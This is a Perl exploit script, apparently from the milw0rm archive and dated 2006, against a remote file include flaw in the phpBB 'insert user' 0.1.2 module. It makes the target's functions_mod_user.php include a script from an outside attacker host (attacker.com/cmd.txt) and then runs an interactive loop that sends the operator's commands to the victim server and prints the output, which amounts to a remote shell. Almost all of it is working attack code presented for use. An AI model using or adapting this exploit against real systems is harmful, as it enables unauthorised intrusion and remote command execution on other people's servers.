#!/usr/bin/perl
 
################################################################################
#                                                                              #
# PHPBB insert user 0.1.2                                                      #
#                                                                              #
# Class:   Remote File Include Vulnerability                                   #
#                                                                              #
# Patch:   unavailable                                                         #
#                                                                              #
# Date:    2006/10/12                                                          #
#                                                                              #
# Remote:  Yes                                                                 #
#                                                                              #
# Type:    high                                                                #
#                                                                              #
# Site:    http://www.grahameames.co.uk/phpbb/downloads/insert_user_0.1.2.zip  #
#                                                                              #
################################################################################


use IO::Socket;
use LWP::Simple;

$cmdshell="http://attacker.com/cmd.txt";   # <====== Change This Line With Your Personal Script

print "\n";
print "######################################################################\n";
print "#                                                                    #\n";
print "# PHPBB insert user <= 0.1.2     Remote File Include Vulnerability   #\n";
print "# Bug found By : Ashiyane Corporation                                #\n";
print "# Email: Behrooz Kamalian    Kamalian[at]ashiyane.ir                 #\n";
print "# Web Site : www.Ashiyane.ir                                         #\n";
print "#                                                                    #\n";
print "######################################################################\n";


if (@ARGV < 2)
{
    print "\n Usage: Ashiyane.pl [host] [path] ";
    print "\n EX : Ashiyane.pl www.victim.com /phpbb/  \n\n";
exit;
}


$host=$ARGV[0];
$path=$ARGV[1];
$vul="includes/functions_mod_user.php?phpbb_root_path="

print "Type Your Commands ( uname -a )\n";
print "For Exiit Type END\n";

print "<Shell> ";$cmd = <STDIN>;

while($cmd !~ "END") {
    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Could not connect to host.\n\n";

    print $socket "GET ".$path.$vul.$cmdshell."?cmd=".$cmd."? HTTP/1.1\r\n";
    print $socket "Host: ".$host."\r\n";
    print $socket "Accept: */*\r\n";
    print $socket "Connection: close\r\n\n";

    while ($raspuns = <$socket>)
    {
        print $raspuns;
    }

    print "<Shell> ";
    $cmd = <STDIN>;
}

# milw0rm.com [2006-10-12]